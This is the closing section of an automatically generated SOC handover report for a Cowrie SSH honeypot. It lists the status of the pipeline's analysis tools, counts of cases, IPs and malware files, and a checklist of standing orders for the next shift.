|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 255 cases |
| Tool 34  | Credential Extractor        | ✅ 141 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 14 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 55 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 36 filtered (14.1%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 35 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 28 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 66 priority case(s) shown individually · 41 recon entry/entries in table (18 group(s) consolidating 130 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-05-22T07:52:34Z_
